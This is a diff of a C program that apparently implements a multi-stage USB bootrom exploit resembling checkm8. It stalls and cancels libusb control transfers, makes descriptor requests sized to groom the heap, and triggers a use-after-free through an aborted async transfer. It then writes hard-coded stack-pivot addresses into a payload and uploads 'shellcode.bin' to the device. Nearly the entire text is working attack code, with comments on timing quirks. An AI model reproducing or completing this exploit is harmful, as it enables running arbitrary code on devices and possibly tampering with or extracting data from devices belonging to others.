@@ -132,51 +132,52 @@ int stall(libusb_device_handle *handle)
 		exit(1);
 	}
 
-	/* timeout is supposed ot happen here */
-	//usleep(0);
-
 	if(0 != libusb_cancel_transfer(transfer)) {
 		perror("libusb_cancel_transfer");
 		exit(1);
 	}
 
-	/* Leak on purpose ? */
-//	libusb_free_transfer(transfer);
-
 	return 0;
 }
 
+/* For the two following functions: it is faster to esnd a raw control URB
+ * rather than send a string descriptor request with libusb. Here, because the
+ * device is "frozen", it will wait 1 second for a response to come. But it will
+ * not come.
+ */
 int no_leak(libusb_device_handle *handle)
 {
-	char buffer[0xC1];
+	/* Any size that is > 0xC0 ? */
 	return libusb_control_transfer(handle, LIBUSB_ENDPOINT_IN,
-	                               LIBUSB_REQUEST_GET_DESCRIPTOR, 0x304,
-	                               0x40A, buffer, sizeof(buffer), 1);
+				       LIBUSB_REQUEST_GET_DESCRIPTOR, 0x304, 0,
+				       NULL, 0xC1, 1);
+	//return libusb_get_string_descriptor(handle, 0x04, 0x409, NULL, 0xC1);
 }
 
 
 int leak(libusb_device_handle *handle)
 {
-	char buffer[0xC0];
 	return libusb_control_transfer(handle, LIBUSB_ENDPOINT_IN,
-	                               LIBUSB_REQUEST_GET_DESCRIPTOR, 0x304,
-	                               0x40A, buffer, sizeof(buffer), 1);
+				       LIBUSB_REQUEST_GET_DESCRIPTOR, 0x304, 0,
+				       NULL, 0xC0, 1);
+	//return libusb_get_string_descriptor(handle, 0x04, 0x409, NULL, 0xC0);
 }
 
 void stage1(libusb_device_handle *handle)
 {
-	/* stall */
+	/* stall: send a request, but abort quickly */
 	if(0 > stall(handle)) {
-		perror("libusb_control_transfer");
+		perror("stall");
+		exit(EXIT_FAILURE);
 	}
 
-	/* leak: same */
+	/* no_leak: ? */
 	for(int i = 0; i < LEAKS; i++) {
 		/* Retrieves the serial number ? */
 		no_leak(handle);
 	}
 
-	/* usb_req_leak: same ???? */
+	/* leak: ? size of 0xC0, maybe a placeholder object */
 	if(0 > leak(handle)) {
 		perror("leak");
 	}
@@ -187,75 +188,59 @@ void stage1(libusb_device_handle *handle)
 	}
 }
 
-int async(libusb_device_handle *handle)
+void async(libusb_device_handle *handle)
 {
-	char buffer[0x808];
+	char buffer[0x808] = {0};
 	struct libusb_transfer *transfer;
 
-	memset(buffer, 'A', sizeof(buffer));
 	libusb_fill_control_setup(buffer, 0x21, 1, 0, 0, sizeof(buffer) - 8);
 
 	transfer = libusb_alloc_transfer(1);
 	libusb_fill_control_transfer(transfer, handle, buffer, NULL, NULL, 0);
 	libusb_submit_transfer(transfer);
 
-	/* spin lock to mimick perfectly lol */
+	/* This spin lock "waits" for the device to send 0x40 bytes.
+	 * Less bytes won't work. More bytes won't work. Don't ask me. */
 	for(int i = 0; i < 5e3; i++)
 		;
-	//usleep(0);
 
 	libusb_cancel_transfer(transfer);
-
 //	libusb_free_transfer(transfer);
-
-	return 0;
 }
 
 void stage2(libusb_device_handle *handle)
 {
-	int ret;
-
-	ret = async(handle);
-	printf("ret = %d\n", ret);
-
-	sleep(5);
-
-	ret = libusb_control_transfer(handle, 0x21, 4, 0, 0, NULL, 0, 0);
-	printf("ret = %d\n", ret);
+	async(handle);
+	libusb_control_transfer(handle, 0x21, 4, 0, 0, NULL, 0, 0);
 }
 
 void stage3(libusb_device_handle *handle)
 {
-	char buffer[0x800];
+	char buffer[0x800] = {0};
+
+	size_t i;
+	ssize_t size;
+	int fd;
 
 	/* usb_req_stall: read spanish iSerialNumber */
 	if(0 > libusb_control_transfer(handle, 2, 3, 0, 0x80, NULL, 0, 10)) {
 		perror("libusb_contorl_transfer");
 	}
 
-	memset(buffer, 0, sizeof(buffer));
 	if(0 > libusb_control_transfer(handle, LIBUSB_ENDPOINT_IN, 6, 0x304, 0x40A, buffer, 0x40, 1)) {
 		perror("usb_req_leak");
 	}
-	puts("usb_req_leak ok");
 
 	memset(buffer, 0, 0x5A0);
 	*((uint64_t*)(buffer + 0x5A0)) = 0x10000CC6C; // stack pivot
 	*((uint64_t*)(buffer + 0x5A8)) = 0x1800B0800; // ?
-
-	libusb_control_transfer(handle, LIBUSB_ENDPOINT_OUT, 0, 0, 0, buffer, 0x5B0, 10);
-
-	size_t i;
-	ssize_t size;
-	int fd;
+	libusb_control_transfer(handle, LIBUSB_ENDPOINT_OUT, 0, 0, 0, buffer, 0x5B0, 0);
 
 	fd = open("shellcode.bin", O_RDONLY);
-	while(0 < (size = read(fd, buffer, sizeof(buffer)))) {
+	while(0 < (size = read(fd, buffer, sizeof(buffer))))
 		libusb_control_transfer(handle, 0x21, 1, 0, 0, buffer, size, 10);
-	}
 	close(fd);
 
-	sleep(1);
 	if(0 != libusb_reset_device(handle)) {
 		perror("libusb_reset_device");
 	}
@@ -363,7 +348,7 @@ int main(int argc, char* argv[])
 	/* Give some time for it to reboot */
 	/* Actually it doesn't work ; check demsg */
 	ret = EXIT_SUCCESS;
-	goto clean3;
+	goto clean1;
 	sleep(5);
 
 	/* Find the correct device by vendore id/device id */
